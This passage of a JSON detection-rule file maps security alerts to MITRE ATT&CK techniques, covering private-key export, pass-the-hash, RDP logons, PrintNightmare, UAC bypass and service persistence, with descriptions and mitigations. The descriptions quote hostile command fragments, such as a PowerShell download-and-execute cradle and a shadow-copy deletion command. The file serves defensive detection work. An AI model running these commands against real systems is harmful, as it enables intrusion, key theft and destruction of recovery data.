            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 92223,
        "rule_description": "PFX file $(win.eventdata.targetFilename) was created",
        "mitre_id": [
            "T1552"
        ],
        "possible_attacks": [
            "Unsecured Credentials"
        ],
        "description": [
            "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History]( operating system or application-specific repositories (e.g. [Credentials in Registry](  or other specialized files/artifacts (e.g. [Private Keys]("
        ],
        "mitigation_strategies": [
            "Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers."
        ]
    },
    {
        "rule_id": 92224,
        "rule_description": "Powershell process created PFX file $(win.eventdata.targetFilename). Possible private key or certificate exportation",
        "mitre_id": [
            "T1552.004"
        ],
        "possible_attacks": [
            "Private Keys"
        ],
        "description": [
            "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via [Network Device CLI]( commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture]( for keylogging or attempt to [Brute Force]( the passphrase off-line. These private keys can be used to authenticate to [Remote Services]( like SSH or for use in decrypting other collected files such as email."
        ],
        "mitigation_strategies": [
            "Ensure permissions are properly set on folders containing sensitive private keys to prevent unintended access. Additionally, on Cisco devices, set the `nonexportable` flag during RSA key pair generation."
        ]
    },
    {
        "rule_id": 92225,
        "rule_description": "An executable file has been copied to Windows start-up folder",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92226,
        "rule_description": "Powershell process has copied an executable file to Windows start-up folder",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92227,
        "rule_description": "$(win.eventdata.image) process created a dll binary $(win.eventdata.fileName)",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92650,
        "rule_description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.",
        "mitre_id": [
            "T1021.002",
            "T1569.002"
        ],
        "possible_attacks": [
            "SMB/Windows Admin Shares",
            "Service Execution"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts]( to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job]( [Service Execution]( and [Windows Management Instrumentation]( Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash]( and certain configuration and patch levels.",
            "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](\n\n[PsExec]( can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as [PsExec]( and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service]( during service persistence or privilege escalation."
        ],
        "mitigation_strategies": [
            "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.",
            "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."
        ]
    },
    {
        "rule_id": 92652,
        "rule_description": "Successful Remote Logon Detected - User:$(win.eventdata.subjectDomainName)\\$(win.eventdata.targetUserName) - NTLM authentication, possible pass-the-hash attack.",
        "mitre_id": [
            "T1550.002",
            "T1078.002"
        ],
        "possible_attacks": [
            "Pass the Hash",
            "Domain Accounts"
        ],
        "description": [
            "Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access]( technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket]( attacks.",
            "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping]( or password reuse, allowing access to privileged resources of the domain."
        ],
        "mitigation_strategies": [
            "Do not allow a domain user to be in the local administrator group on multiple systems.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 92653,
        "rule_description": "User: $(win.eventdata.subjectDomainName)\\$(win.eventdata.targetUserName) logged using Remote Desktop Connection (RDP) from ip:$(win.eventdata.ipAddress).",
        "mitre_id": [
            "T1021.001",
            "T1078.002"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol",
            "Domain Accounts"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence.",
            "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping]( or password reuse, allowing access to privileged resources of the domain."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 92654,
        "rule_description": "WMI query for System Information Discovery.",
        "mitre_id": [
            "T1082",
            "T1047"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation"
        ],
        "description": [
            "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services]( such as [Distributed Component Object Model]( and [Windows Remote Management]( Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery]( as well as [Execution]( of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell]( as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI."
        ]
    },
    {
        "rule_id": 92655,
        "rule_description": "Printer driver failed to load, possible remote code execution using PrinterNightmare exploit: CVE-2021-34527.",
        "mitre_id": [
            "T1210",
            "T1547.012"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services",
            "Print Processors"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well.",
            "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services.",
            "Limit user accounts that can load or unload device drivers by disabling <code>SeLoadDriverPrivilege</code>."
        ]
    },
    {
        "rule_id": 92656,
        "rule_description": "User: $(win.eventdata.subjectDomainName)\\$(win.eventdata.targetUserName) logged using Remote Desktop Connection (RDP) from loopback address, possible exploit over reverse tunneling using stolen credentials.",
        "mitre_id": [
            "T1021.001",
            "T1078.002"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol",
            "Domain Accounts"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence.",
            "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping]( or password reuse, allowing access to privileged resources of the domain."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 92657,
        "rule_description": "Successful Remote Logon Detected - User:$(win.eventdata.subjectDomainName)\\$(win.eventdata.targetUserName) - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that $(win.eventdata.workstationName) is allowed to perform RDP connections",
        "mitre_id": [
            "T1550.002",
            "T1078.002",
            "T1021.001"
        ],
        "possible_attacks": [
            "Pass the Hash",
            "Domain Accounts",
            "Remote Desktop Protocol"
        ],
        "description": [
            "Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access]( technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket]( attacks.",
            "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping]( or password reuse, allowing access to privileged resources of the domain.",
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence."
        ],
        "mitigation_strategies": [
            "Do not allow a domain user to be in the local administrator group on multiple systems.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications.",
            "Limit remote user permissions if remote access is necessary."
        ]
    },
    {
        "rule_id": 92600,
        "rule_description": "Executed python script.",
        "mitre_id": [
            "T1059.006"
        ],
        "possible_attacks": [
            "Python"
        ],
        "description": [
            "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors."
        ],
        "mitigation_strategies": [
            "Prevent users from installing Python where not required."
        ]
    },
    {
        "rule_id": 92601,
        "rule_description": "Executed python script from /tmp/ folder.",
        "mitre_id": [
            "T1059.006"
        ],
        "possible_attacks": [
            "Python"
        ],
        "description": [
            "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors."
        ],
        "mitigation_strategies": [
            "Prevent users from installing Python where not required."
        ]
    },
    {
        "rule_id": 92602,
        "rule_description": "Suspicious python script matches Impacket signature, possible use of stolen credentials or pass the hash attack.",
        "mitre_id": [
            "T1059.006",
            "T1550.002"
        ],
        "possible_attacks": [
            "Python",
            "Pass the Hash"
        ],
        "description": [
            "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
            "Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access]( technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket]( attacks."
        ],
        "mitigation_strategies": [
            "Prevent users from installing Python where not required.",
            "Do not allow a domain user to be in the local administrator group on multiple systems."
        ]
    },
    {
        "rule_id": 92603,
        "rule_description": "A file was copied to this system over SSH using SCP.",
        "mitre_id": [
            "T1021.004"
        ],
        "possible_attacks": [
            "SSH"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 92604,
        "rule_description": "Processes running for all users were queried with ps command.",
        "mitre_id": [
            "T1057"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92605,
        "rule_description": "Executed recursive query of all files using ls command.",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92300,
        "rule_description": "Added registry content to be executed on next logon",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92301,
        "rule_description": "Suspicious file extension detected in registry ASEP to be executed on next logon",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92302,
        "rule_description": "Registry entry to be executed on next logon was modified using command line application reg.exe",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92303,
        "rule_description": "Registry entry to be executed on next logon points to a remote access tool",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92304,
        "rule_description": "Modified registry key associated to UAC bypass by auto-elevated processes",
        "mitre_id": [
            "T1548.002",
            "T1112"
        ],
        "possible_attacks": [
            "Bypass User Account Control",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking](",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 92305,
        "rule_description": "Command interpreter added to registry key associated to UAC bypass by auto-elevated processes",
        "mitre_id": [
            "T1548.002",
            "T1112"
        ],
        "possible_attacks": [
            "Bypass User Account Control",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking](",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 92306,
        "rule_description": "$(win.eventdata.image) added to the registry a subkey associated with UAC bypass by auto-elevated processes",
        "mitre_id": [
            "T1548.002",
            "T1112"
        ],
        "possible_attacks": [
            "Bypass User Account Control",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking](",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 92307,
        "rule_description": "Evidence of new service creation found in registry under $(win.eventdata.targetObject) binary is: $(win.eventdata.details)",
        "mitre_id": [
            "T1543.003"
        ],
        "possible_attacks": [
            "Windows Service"
        ],
        "description": [
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an 